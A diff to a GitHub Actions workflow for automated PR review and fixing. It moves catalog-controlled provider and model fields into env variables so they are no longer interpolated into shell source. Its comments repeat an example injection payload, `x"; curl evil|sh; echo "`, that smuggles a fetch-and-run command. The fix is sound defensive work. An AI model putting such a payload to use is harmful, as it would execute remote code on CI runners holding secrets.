@@ -1348,6 +1348,9 @@ jobs:
           # [OPUS-4.8] B3: the target policy row's security_paths (base64 JSON list). Each path
           # becomes a --surface-path so a trust-surface diff routes its arm to a human.
           SECURITY_PATHS_B64: ${{ needs.resolve.outputs.security_paths }}
+          # Catalog-controlled provider reaches this job via env ONLY — never interpolated into the
+          # run: shell source, where `x"; curl evil|sh; echo "` would execute (issue #199).
+          IMPL_PROVIDER: ${{ needs.resolve.outputs.impl_provider }}
         run: |
           set -euo pipefail
           args=(
@@ -1359,7 +1362,7 @@ jobs:
             --round "${{ inputs.review_round }}"
             --max-rounds "${{ needs.resolve.outputs.max_review_rounds }}"
             --issue "${{ needs.resolve.outputs.issue }}"
-            --impl-provider "${{ needs.resolve.outputs.impl_provider }}"
+            --impl-provider "$IMPL_PROVIDER"
             --bot-login "${{ needs.resolve.outputs.pr_author }}"
             --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT"
             --reviewed-sha "${{ needs.run.outputs.reviewed_sha }}"
@@ -1407,6 +1410,11 @@ jobs:
           # set, resolved once above). The arm re-reads LIVE PR + source-issue labels against
           # these so a security label added DURING the review still lands in the audit trail.
           SECURITY_KEYWORDS_B64: ${{ needs.resolve.outputs.security_keywords }}
+          # Catalog-controlled providers reach this contents:write + PROVENANCE_SALT arm job via env
+          # ONLY — never interpolated into the run: shell source, where `x"; curl evil|sh; echo "`
+          # would execute (issue #199). worker-pr.py ready-and-arm asserts reviewer != implementer.
+          IMPL_PROVIDER: ${{ needs.resolve.outputs.impl_provider }}
+          REVIEWER_PROVIDER: ${{ needs.claim.outputs.provider }}
         run: |
           set -euo pipefail
           args=(
@@ -1414,9 +1422,9 @@ jobs:
             --repo "${{ inputs.target_repo }}"
             --pr "${{ inputs.pr_number }}"
             --reviewed-sha "${{ needs.run.outputs.reviewed_sha }}"
-            --impl-provider "${{ needs.resolve.outputs.impl_provider }}"
+            --impl-provider "$IMPL_PROVIDER"
             --impl-account-h "${{ needs.resolve.outputs.impl_account_h }}"
-            --reviewer-provider "${{ needs.claim.outputs.provider }}"
+            --reviewer-provider "$REVIEWER_PROVIDER"
             --arm "${{ needs.resolve.outputs.arm_auto_merge }}"
             --issue "${{ needs.resolve.outputs.issue }}"
             --bot-login "${{ needs.resolve.outputs.pr_author }}"
@@ -1463,6 +1471,10 @@ jobs:
           ALERT_REPO: ${{ secrets.ALERT_REPO || vars.ALERT_REPO || '' }}
           ALERT_TOKEN: ${{ secrets.ALERT_TOKEN || '' }}
           MAINTAINER_HANDLE: jeswr
+          # Catalog-controlled model alias reaches this write-scoped App-token job via env ONLY —
+          # never interpolated into the run: shell source, where `x"; curl evil|sh; echo "` would
+          # execute (issue #199, same class as the provider paths).
+          MODEL_ALIAS: ${{ needs.claim.outputs.model }}
         run: |
           python3 registry/scripts/worker-pr.py fix-outcome \
             --repo "${{ inputs.target_repo }}" \
@@ -1470,7 +1482,7 @@ jobs:
             --round "${{ inputs.review_round }}" \
             --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
             --bot-login "${{ needs.resolve.outputs.pr_author }}" \
-            --model "${{ needs.claim.outputs.model }}" \
+            --model "$MODEL_ALIAS" \
             --injection "${{ needs.run.outputs.injection_detected == 'true' && 'true' || 'false' }}" \
             --made-changes "${{ needs.run.outputs.fix_made_changes == 'true' && 'true' || 'false' }}" \
             --gate-outcome "${{ needs.run.outputs.gate_outcome }}" \
@@ -1560,12 +1572,20 @@ jobs:
           # handle so only the 16-hex hash is stored. This job runs no target code.
           WORKER_ACCOUNT_HANDLE: ${{ needs.claim.outputs.account }}
           PROVENANCE_SALT: ${{ secrets.PROVENANCE_SALT }}
+          # Catalog-controlled (provider/alias) and provider-derived (reset-hint) fields reach this
+          # contents:write + PROVENANCE_SALT job via env ONLY — never in the run: shell source,
+          # where `x"; curl evil|sh; echo "` would execute (issue #199). model-health.py record
+          # re-validates the provider against {anthropic, openai, fleet}.
+          PROVIDER: ${{ needs.claim.outputs.provider }}
+          MODEL_ALIAS: ${{ needs.claim.outputs.model }}
+          EXIT_CLASS: ${{ needs.run.outputs.exit_class }}
+          RESET_HINT: ${{ needs.run.outputs.reset_hint }}
         run: |
           python3 registry/scripts/model-health.py record \
-            --provider "${{ needs.claim.outputs.provider }}" \
-            --model-alias "${{ needs.claim.outputs.model }}" \
-            --exit-class "${{ needs.run.outputs.exit_class }}" \
-            --reset-hint "${{ needs.run.outputs.reset_hint }}" \
+            --provider "$PROVIDER" \
+            --model-alias "$MODEL_ALIAS" \
+            --exit-class "$EXIT_CLASS" \
+            --reset-hint "$RESET_HINT" \
             --run-id "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT"
 
   release:
